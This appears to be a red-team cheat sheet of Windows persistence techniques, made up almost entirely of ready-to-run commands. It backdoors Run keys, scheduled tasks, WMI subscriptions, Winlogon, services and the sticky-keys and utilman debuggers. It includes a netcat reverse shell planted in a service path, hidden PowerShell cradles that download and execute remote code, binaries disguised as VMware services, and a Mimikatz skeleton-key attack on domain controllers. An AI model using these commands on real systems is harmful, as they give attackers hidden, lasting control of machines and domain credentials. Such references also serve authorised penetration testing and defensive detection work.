

### Registry Persistence
## Userland AutoRun Persistence:
```

reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

shell reg delete  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Vmware-Services /f

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Service /t REG_SZ /d "C:\Users\Public\\MeMe.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"

REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\Users\KarMarKhaing\Vmware_Host.exe -e cmd.exe 192.168.100.10 9090"
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\meme.exe

```
## Elevated AutoRun Persistence:
```


reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Service /t REG_SZ /d"C:\Users\Public\MeMe.exe"
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "c:\windows\system32\spool\drivers\color\nc.exe 10.10.80.199 8888 -e cmd.exe" /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor/t REG_SZ /d C:\Users\Public\meme.exe
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\Vmware_Host.exe
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Vmware /t REG_SZ /d "C:\Users\Public\Vmware_Host.exe" 

```
### Scheduling Persistence 
```
#Userland Scheduled Task Persistence:
schtasks /create /tn "Scheduled_Persistence" /tr "cmd.exe /c C:\Users\Public\Vmware_Host.exe" /sc daily /st 18:30

#Elevated Scheduled Task Persistence:
schtasks /create /ru "SYSTEM" /tn "System_Persistence" /tr "cmd.exe /c C:\Users\Public\Vmware_Host.exe" /sc daily /st 18:36
```

```
schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.100.100:8080/ZPWLywg'''))'" /sc onlogon /ru System

schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onstart /ru System

schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30
```
### WMI Persistence 
```

wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="service", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="service", ExecutablePath="C:\Windows\System32\pentestlab.exe",CommandLineTemplate="C:\Windows\System32\pentestlab.exe"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"service\"", Consumer="CommandLineEventConsumer.Name=\"service\""
```
### Office Persistence 
```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\Users\KarMarKhaing\Service.dll
```
### Winlogon Persistence
```
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"


reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Users\KarMarKhaing\Vmware_Host.exe","C:\Windows\system32\userinit.exe"

```
### Startup Folder
```
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c meme.exe" -f "Some File" -m add
```
### Services Persistence

```
New-Service -Name "MS_Service for Startups" -BinaryPathName " C:\Users\KarMarKhaing\MS_Startup.exe" -Description "Microsoft Service for Startups"

```

### Stand-Alone Persistence

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

```
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>

Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator

```
